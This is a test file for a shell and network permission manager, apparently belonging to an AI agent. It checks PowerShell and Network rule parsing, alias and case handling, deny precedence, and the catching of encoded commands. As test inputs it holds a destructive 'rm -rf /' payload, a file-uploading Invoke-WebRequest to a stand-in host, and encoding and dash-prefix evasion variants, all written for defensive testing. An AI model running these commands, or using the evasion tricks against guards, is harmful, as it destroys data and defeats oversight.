// Owner 2026-10-25: unsandboxed PowerShell gets exact `PowerShell(<command>)` rules matched on a canonical parsed form with the same strictness as Bash, and the network card's saves become `Network(<host>[:port])` host rules.
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionManager } from "../permission-manager.js";
import { __resetActiveSandboxCapabilityForTest, __resetSandboxRequestedAtBootForTest } from "../sandbox-capability.js";
import { __resetSessionStoreForTest } from "../user-approval-store.js";
import { canonicalRuleSpecifier, normalizeRuleSpecifierInput, parseRuleSpecifier } from "../rules/rule-specifier.js";
import { buildShellRuleApproval, isWildcardShellRule, shellRuleCoversCommand } from "../rules/shell-rule-approval.js";
import { powerShellRuleShape } from "../rules/powershell-exfiltration.js";
import { validatePermissionRule } from "../rules/rule-files.js";

let dir: string;
let manager: PermissionManager;
beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "powershell-network-rules-")));
  const home = join(dir, "home");
  mkdirSync(home);
  vi.stubEnv("HOME", home);
  vi.stubEnv("USERPROFILE", home);
  vi.stubEnv("AVE_HOME", join(dir, "state"));
  manager = new PermissionManager(join(dir, "permissions.json"));
});
afterEach(() => {
  __resetSessionStoreForTest();
  __resetActiveSandboxCapabilityForTest();
  __resetSandboxRequestedAtBootForTest();
  vi.unstubAllEnvs();
  rmSync(dir, { recursive: true, force: true });
});

function powershell(command: string, runsSandboxed: boolean, extra: { headless?: boolean; sessionId?: string } = {}) {
  return manager.checkDetailed("powershell", "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect: "powershell", command, cwd: dir },
    shellExecution: { runsSandboxed },
    ...extra,
  });
}

describe("PowerShell(...) rule grammar", () => {
  it.each([
    ["PowerShell(get-childitem src)", { tokens: ["get-childitem", "src"], wildcard: false }],
    ["PowerShell(git status *)", { tokens: ["git", "status"], wildcard: true }],
    ["PowerShell(get-childitem -recurse src)", { tokens: ["get-childitem", "-recurse", "src"], wildcard: false }],
  ])("parses %s", (text, expected) => {
    expect(parseRuleSpecifier(text)).toEqual({ kind: "powershell", ...expected });
    expect(canonicalRuleSpecifier(text)).toBe(text);
  });

  it("takes the canonical command and parameter spelling an edited rule is saved in", () => {
    expect(normalizeRuleSpecifierInput("  PowerShell(Get-ChildItem   -Recurse  Src) ")).toBe("PowerShell(get-childitem -recurse Src)");
    // An alias is a different literal command name: rule identity never resolves it (it means different programs across editions).
    expect(normalizeRuleSpecifierInput("PowerShell(gci src *)")).toBe("PowerShell(gci src *)");
    // The stored form must already be canonical: a hand-written alias or capital is refused, never mapped.
    expect(() => validatePermissionRule({ pattern: "PowerShell(Get-ChildItem src)", action: "allow" })).toThrow(/canonical/);
  });

  it.each([
    "PowerShell($env:PATH)", "PowerShell(get-content (gc x))", "PowerShell(iex 'x')", "PowerShell(a;b)",
    "PowerShell(a|b)", "PowerShell(@args)", "PowerShell(*)", "PowerShell()", "PowerShell(. ./x.ps1)", "PowerShell(gc a*b)",
  ])("refuses %s, which is not literal command text", (text) => {
    expect(() => parseRuleSpecifier(text)).toThrow();
  });
});

describe("PowerShell rule shape", () => {
  it("reads literal simple commands in canonical form and names anything else opaque", () => {
    expect(powerShellRuleShape("Get-ChildItem -Recurse src")).toEqual({ ok: true, commands: [["get-childitem", "-recurse", "src"]], opaque: null });
    expect(powerShellRuleShape("gci src | Select-Object -First 1")).toEqual({ ok: true, commands: [["gci", "src"], ["select-object", "-first", "1"]], opaque: null });
    expect(powerShellRuleShape("$x = gci src")).toMatchObject({ ok: true, opaque: "assignment" });
    // A non-literal argument stays visible as null, so a deny prefix still sees the literal words before it.
    expect(powerShellRuleShape("Remove-Item $env:TEMP")).toEqual({ ok: true, commands: [["remove-item", null]], opaque: "non-literal argument" });
    expect(powerShellRuleShape("& $tool run")).toEqual({ ok: true, commands: [], opaque: "non-literal command" });
  });
});

describe("unsandboxed PowerShell runs unasked only on an exact PowerShell(...) rule", () => {
  it.each(["default", "auto", "allow"] as const)("matches the canonical form exactly in %s mode", (mode) => {
    manager.setMode(mode);
    expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "ask", layer: 6 });
    manager.setRules([{ pattern: "PowerShell(get-childitem src)", action: "allow" }]);
    expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "allow", layer: 3 });
    // The same cmdlet in another case is the same canonical argv; an alias is not (it can name another program).
    expect(powershell("GET-CHILDITEM src", false)).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("gci src", false)).toMatchObject({ decision: "ask" });
    expect(powershell("GET-CHILDITEM src", false)).toMatchObject({ decision: "allow", layer: 3 });
    // Any other argument, a second command or an expansion is not covered.
    expect(powershell("Get-ChildItem src -Recurse", false)).toMatchObject({ decision: "ask" });
    expect(powershell("Get-ChildItem Src", false)).toMatchObject({ decision: "ask" });
    expect(powershell("Get-ChildItem src; Get-ChildItem src", false)).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("Get-ChildItem src; Remove-Item x", false)).toMatchObject({ decision: "ask" });
    expect(powershell("Get-ChildItem $dir", false)).toMatchObject({ decision: "ask" });
  });

  it("never lets a wildcard allow run an unsandboxed call, and keeps it for a sandboxed one", () => {
    manager.setRules([{ pattern: "PowerShell(get-childitem *)", action: "allow" }]);
    expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "ask", layer: 6 });
    expect(powershell("Get-ChildItem src", true)).toMatchObject({ decision: "allow" });
  });

  it("keeps the dialects apart: a Bash rule never runs PowerShell, nor the reverse", () => {
    manager.setRules([{ pattern: "Bash(git status)", action: "allow" }]);
    expect(powershell("git status", false)).toMatchObject({ decision: "ask" });
    manager.setRules([{ pattern: "PowerShell(git status)", action: "allow" }]);
    expect(manager.checkDetailed("bash", "builtin", "shell", null, {
      ruleSubject: { kind: "shell", dialect: "bash", command: "git status", cwd: dir },
      shellExecution: { runsSandboxed: false },
    })).toMatchObject({ decision: "ask" });
  });

  it("never allows a floor over an exact rule", () => {
    manager.setRules([{ pattern: "PowerShell(get-content notes.txt)", action: "allow" }]);
    expect(powershell("Get-Content notes.txt", false)).toMatchObject({ decision: "allow", layer: 3 });
    manager.setRules([{ pattern: "PowerShell(invoke-webrequest -method Post -infile notes.txt https://x.test)", action: "allow" }]);
    expect(powershell("Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  it("denies on a matching deny rule, wildcard included, and asks when a deny rule cannot inspect the input", () => {
    manager.setRules([{ pattern: "PowerShell(remove-item *)", action: "deny" }]);
    expect(powershell("Remove-Item -Recurse build", true)).toMatchObject({ decision: "deny", layer: 1 });
    expect(powershell("ri build", false)).toMatchObject({ decision: "deny", layer: 1 });
    expect(powershell("$p = 'build'; Remove-Item $p", true)).toMatchObject({ decision: "deny", layer: 1 });
    expect(powershell("$p = 'build'; Write-Output $p", true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  it("runs a headless unsandboxed call on its exact rule and denies one without", () => {
    expect(powershell("Get-ChildItem src", false, { headless: true })).toMatchObject({ decision: "deny", layer: 6 });
    manager.setRules([{ pattern: "PowerShell(get-childitem src)", action: "allow" }]);
    expect(powershell("Get-ChildItem src", false, { headless: true })).toMatchObject({ decision: "allow", layer: 3 });
  });

  it("applies a session PowerShell rule to its conversation only", () => {
    manager.addSessionRule("conversation-a", "PowerShell(get-childitem src)");
    expect(powershell("Get-ChildItem src", false, { sessionId: "conversation-a" })).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("Get-ChildItem src", false, { sessionId: "conversation-b" })).toMatchObject({ decision: "ask" });
  });
});

// Security review of #223: a native program's arguments are case-sensitive data, and an alias can name a different program per edition or platform.
describe("PowerShell rule identity keeps native arguments and command names literal", () => {
  it.each([
    ["git branch -d feature", "git branch -D feature"],
    ["git clean -n", "git clean -N"],
    ["git push -n origin", "git push -N origin"],
    ["git log -s", "git log -S"],
    ["java -Dfoo=SAFE Main", "java -Dfoo=safe Main"],
    ["java -Dfoo=SAFE Main", "java -dfoo=SAFE Main"],
  ])("a rule for %s does not run %s", (allowed, other) => {
    const rule = buildShellRuleApproval("powershell", allowed, dir, { allow: true, deny: true }).exactRule;
    expect(rule).toBe(`PowerShell(${allowed})`);
    manager.setRules([{ pattern: rule!, action: "allow" }]);
    expect(powershell(allowed, false)).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell(other, false)).toMatchObject({ decision: "ask" });
  });

  it("folds a known cmdlet's parameter names but never the value after the colon", () => {
    expect(normalizeRuleSpecifierInput("PowerShell(Get-ChildItem -Path:Foo)")).toBe("PowerShell(get-childitem -path:Foo)");
    manager.setRules([{ pattern: "PowerShell(get-childitem -path:Foo)", action: "allow" }]);
    expect(powershell("Get-ChildItem -PATH:Foo", false)).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("Get-ChildItem -Path:foo", false)).toMatchObject({ decision: "ask" });
  });

  it("keeps an unknown command's tokens verbatim, its name included", () => {
    expect(normalizeRuleSpecifierInput("PowerShell(MyTool -Flag X)")).toBe("PowerShell(MyTool -Flag X)");
  });

  it.each([
    ["sc", "sc config svc", "PowerShell(set-content config svc)"],
    ["curl", "curl https://x.test", "PowerShell(invoke-webrequest https://x.test)"],
    ["wget", "wget https://x.test", "PowerShell(invoke-webrequest https://x.test)"],
    ["ls", "ls src", "PowerShell(get-childitem src)"],
    ["rm", "rm build", "PowerShell(remove-item build)"],
    ["cat", "cat notes.txt", "PowerShell(get-content notes.txt)"],
  ])("an allow for the cmdlet never runs %s, which is a native program in some editions", (_alias, command, cmdletRule) => {
    manager.setRules([{ pattern: cmdletRule, action: "allow" }]);
    expect(powershell(command, false)).toMatchObject({ decision: "ask" });
  });

  it("an alias allow is its own literal rule, and a cmdlet deny still meets the alias", () => {
    manager.setRules([{ pattern: "PowerShell(ls src)", action: "allow" }]);
    expect(powershell("ls src", false)).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "ask" });
    manager.setRules([{ pattern: "PowerShell(remove-item *)", action: "deny" }]);
    expect(powershell("rm build", true)).toMatchObject({ decision: "deny", layer: 1 });
  });
});

// Re-review of #223: a deny or ask rule meets every spelling of the command name (a path, `.exe`, a `Module\` qualifier, an alias on either side), so a
// deny written for a command wins over every allow on both lanes; an allow keeps the literal identity.
describe("PowerShell deny and ask rules meet every spelling of the command name", () => {
  it.each([
    ["PowerShell(git push *)", "git.exe push --force"],
    ["PowerShell(git push *)", "C:\\Git\\bin\\git.exe push"],
    ["PowerShell(git push *)", "GIT.EXE push origin"],
    ["PowerShell(remove-item *)", "Microsoft.PowerShell.Management\\Remove-Item x"],
  ])("deny %s refuses %s, sandboxed or not, over any allow", (deny, command) => {
    manager.setRules([{ pattern: "PowerShell(git *)", action: "allow" }, { pattern: "PowerShell(remove-item *)", action: "allow" }, { pattern: deny, action: "deny" }]);
    expect(powershell(command, true)).toMatchObject({ decision: "deny", layer: 1 });
    expect(powershell(command, false)).toMatchObject({ decision: "deny", layer: 1 });
    manager.setRules([{ pattern: "PowerShell(git *)", action: "allow" }, { pattern: deny, action: "ask" }]);
    expect(powershell(command, true)).toMatchObject({ decision: "ask" });
  });

  it.each([
    ["PowerShell(gci *)", "Get-ChildItem src"],
    ["PowerShell(iwr *)", "Invoke-WebRequest https://example.com"],
    ["PowerShell(ls *)", "Get-ChildItem src"],
  ])("a deny written with an alias (%s) also refuses its cmdlet (%s)", (deny, command) => {
    manager.setRules([{ pattern: deny, action: "deny" }]);
    expect(powershell(command, true)).toMatchObject({ decision: "deny", layer: 1 });
    expect(powershell(command, false)).toMatchObject({ decision: "deny", layer: 1 });
  });

  it("keeps an allow literal: a pathed or .exe spelling is not the allowed command", () => {
    manager.setRules([{ pattern: "PowerShell(git status)", action: "allow" }, { pattern: "PowerShell(gci src)", action: "allow" }]);
    expect(powershell("git status", false)).toMatchObject({ decision: "allow", layer: 3 });
    expect(powershell("git.exe status", false)).toMatchObject({ decision: "ask" });
    expect(powershell("C:\\Git\\bin\\git.exe status", false)).toMatchObject({ decision: "ask" });
    expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "ask" });
  });
});

// Security review of #223: an -EncodedCommand payload meets the same floors as plaintext -Command, and no allow rule covers it.
describe("PowerShell -EncodedCommand", () => {
  const encode = (script: string) => Buffer.from(script, "utf16le").toString("base64");
  const DESTRUCTIVE = "rm -rf /";

  it.each(["powershell", "bash"] as const)("a destructive decoded payload hits the same forced modal as plaintext -Command (%s)", (dialect) => {
    const run = (command: string) => manager.checkDetailed(dialect, "builtin", "shell", null, {
      ruleSubject: { kind: "shell", dialect, command, cwd: dir },
      shellExecution: { runsSandboxed: true },
    });
    const plaintext = run(`pwsh -NoProfile -Command "${DESTRUCTIVE}"`);
    expect(plaintext).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    for (const flag of ["-EncodedCommand", "-enc", "-e", "-ec"]) {
      expect(run(`pwsh -NoProfile ${flag} ${encode(DESTRUCTIVE)}`)).toMatchObject({ decision: "ask", layer: 2, forceModal: true, reason: plaintext.reason });
    }
  });

  it("never runs an encoded command on an allow rule, and the card shows the decoded script with no exact rule", () => {
    const command = `pwsh -EncodedCommand ${encode("Get-ChildItem src")}`;
    manager.setRules([{ pattern: `PowerShell(${command})`, action: "allow" }]);
    expect(powershell(command, false)).toMatchObject({ decision: "ask" });
    const card = buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true });
    expect(card.exactRule).toBeNull();
    expect(card.decodedCommands).toEqual(["Get-ChildItem src"]);
    expect(buildShellRuleApproval("powershell", "Get-ChildItem src", dir, { allow: true, deny: true })).not.toHaveProperty("decodedCommands");
  });

  it("leaves a payload that is not UTF-16LE text opaque, and offers no exact rule for it", () => {
    const card = buildShellRuleApproval("powershell", "pwsh -EncodedCommand AAAA", dir, { allow: true, deny: true });
    expect(card).not.toHaveProperty("decodedCommands");
    expect(card.exactRule).toBeNull();
  });

  // Re-review: .NET's FromBase64String ignores whitespace, and PowerShell's parser takes any dash as a parameter prefix.
  it("decodes a quoted payload split by whitespace", () => {
    const split = encode(DESTRUCTIVE).replace(/(.{4})/g, "$1 ").trim();
    const card = buildShellRuleApproval("powershell", `pwsh -enc "${split}"`, dir, { allow: true, deny: true });
    expect(card.decodedCommands).toEqual([DESTRUCTIVE]);
    expect(powershell(`pwsh -enc "${split}"`, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  it.each(["\u2013", "\u2014", "\u2015", "/"])("decodes an encoded command behind the %s parameter prefix", (dash) => {
    const command = `pwsh ${dash}enc ${encode(DESTRUCTIVE)}`;
    expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true }).decodedCommands).toEqual([DESTRUCTIVE]);
    expect(powershell(command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
  });

  // Fail closed: an encoded-command argument whose payload the host cannot fully decode hides the code that runs.
  it.each([
    "pwsh -enc AAAA",
    'pwsh -enc "!!!!"',
    "pwsh \u2013e ????",
    "pwsh -EncodedCommand",
    `powershell.exe -ec ${encode("Get-ChildItem").slice(0, -1)}`,
  ])("treats an undecodable payload as hidden code: forced modal, no allow rule (%s)", (command) => {
    manager.setRules([{ pattern: "PowerShell(pwsh *)", action: "allow" }, { pattern: "PowerShell(powershell.exe *)", action: "allow" }]);
    expect(powershell(command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
    expect(powershell(command, false)).toMatchObject({ decision: "ask", forceModal: true });
    expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true }).exactRule).toBeNull();
  });

  it("does not read a -Command script's own -e argument as an encoded command", () => {
    const card = buildShellRuleApproval("powershell", 'pwsh -NoProfile -Command "Select-String -e needle notes.txt"', dir, { allow: true, deny: true });
    expect(card).not.toHaveProperty("decodedCommands");
    expect(powershell('pwsh -NoProfile -Command "Select-String -e needle notes.txt"', true)).not.toMatchObject({ forceModal: true });
  });
});

describe("the rules a PowerShell card offers", () => {
  it("derives the exact canonical rule and its deny for one literal command", () => {
    expect(buildShellRuleApproval("powershell", "Get-ChildItem -Recurse src", dir, { allow: true, deny: true }, "conversation-a")).toMatchObject({
      dialect: "powershell",
      exactRule: "PowerShell(get-childitem -recurse src)",
      denyRule: "PowerShell(get-childitem -recurse src)",
      denyAllowed: true,
      sessionAllowed: true,
      persistentAllowed: true,
    });
  });

  it.each(["$x = gci src", "Get-ChildItem src | Remove-Item", "Write-Host $env:USERNAME"])("offers no exact allow for %s", (command) => {
    expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
  });

  it("offers Always deny but no allow for a floor command", () => {
    const approval = buildShellRuleApproval("powershell", "Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", dir, { allow: true, deny: true }, "conversation-a");
    expect(approval).toMatchObject({ exactRule: null, persistentAllowed: false, denyRule: "PowerShell(invoke-webrequest -method Post -infile notes.txt https://x.test)" });
  });

  it("checks an edited rule against the PowerShell matcher", () => {
    expect(shellRuleCoversCommand("powershell", "PowerShell(get-childitem *)", "allow", "Get-ChildItem src", dir)).toBe(true);
    expect(shellRuleCoversCommand("powershell", "PowerShell(get-childitem *)", "allow", "gci src", dir)).toBe(false);
    expect(shellRuleCoversCommand("powershell", "PowerShell(get-childitem *)", "deny", "gci src", dir)).toBe(true);
    expect(shellRuleCoversCommand("powershell", "PowerShell(remove-item *)", "deny", "ri build", dir)).toBe(true);
    expect(shellRuleCoversCommand("powershell", "PowerShell(get-childitem other)", "allow", "Get-ChildItem src", dir)).toBe(false);
    expect(shellRuleCoversCommand("powershell", "Bash(gci src)", "allow", "gci src", dir)).toBe(false);
    expect(isWildcardShellRule("PowerShell(get-childitem *)")).toBe(true);
    expect(isWildcardShellRule("PowerShell(get-childitem src)")).toBe(false);
  });
});

describe("Network(...) host rules", () => {
  it.each([
    ["Network(api.example.com)", { host: "api.example.com", subdomains: false }],
    ["Network(*.example.com:443)", { host: "example.com", subdomains: true, port: 443 }],
  ])("parses %s", (text, expected) => {
    expect(parseRuleSpecifier(text)).toEqual({ kind: "network", ...expected });
    expect(canonicalRuleSpecifier(text)).toBe(text);
  });

  it.each(["Network(API.example.com)", "Network(*.com)", "Network(example.com:0)", "Network(a b)", "Network()"])("refuses %s", (text) => {
    expect(() => parseRuleSpecifier(text)).toThrow();
  });

  // An address never reaches a host rule, so a rule naming one would be a silently inert deny: every address spelling is refused when parsed.
  it.each(["Network(127.0.0.1)", "Network(169.254.169.254:80)", "Network(0x7f000001)", "Network(2130706433)", "Network(127.1)", "Network(*.0.0.1)"])("refuses the address literal %s", (text) => {
    expect(() => parseRuleSpecifier(text)).toThrow(/IP address is not a host name/);
  });

  it("still accepts host names with digits", () => {
    expect(parseRuleSpecifier("Network(s3.eu-west-1.amazonaws.com)")).toMatchObject({ kind: "network" });
    expect(parseRuleSpecifier("Network(1password.com)")).toMatchObject({ kind: "network" });
  });

  it("decides a destination by deny, then ask, then allow, over user, project and session rules", async () => {
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443 })).toBeUndefined();
    manager.setRules([{ pattern: "Network(*.example.com)", action: "allow" }]);
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443 })).toEqual({ decision: "allow", pattern: "Network(*.example.com)", scope: "user" });
    expect(await manager.networkRuleDecision({ host: "example.com", port: 443 })).toBeUndefined();
    await manager.addRulePersist({ pattern: "Network(api.example.com:443)", action: "ask" }, { kind: "project", projectCwd: dir });
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443, projectCwd: dir })).toEqual({ decision: "ask", pattern: "Network(api.example.com:443)", scope: "project" });
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443 })).toEqual({ decision: "allow", pattern: "Network(*.example.com)", scope: "user" });
    manager.addSessionRule("conversation-a", "Network(other.test)");
    expect(await manager.networkRuleDecision({ host: "other.test", port: 80, sessionId: "conversation-a" })).toEqual({ decision: "allow", pattern: "Network(other.test)", scope: "session" });
    expect(await manager.networkRuleDecision({ host: "other.test", port: 80, sessionId: "conversation-b" })).toBeUndefined();
    await manager.addRulePersist({ pattern: "Network(api.example.com)", action: "deny" }, { kind: "user" });
    expect(await manager.networkRuleDecision({ host: "api.example.com", port: 443, projectCwd: dir })).toEqual({ decision: "deny", pattern: "Network(api.example.com)", scope: "user" });
  });

  it("refuses a session rule of another kind", () => {
    expect(() => manager.addSessionRule("conversation-a", "Edit(/tmp/x)")).toThrow(/session rule must be/);
  });
});
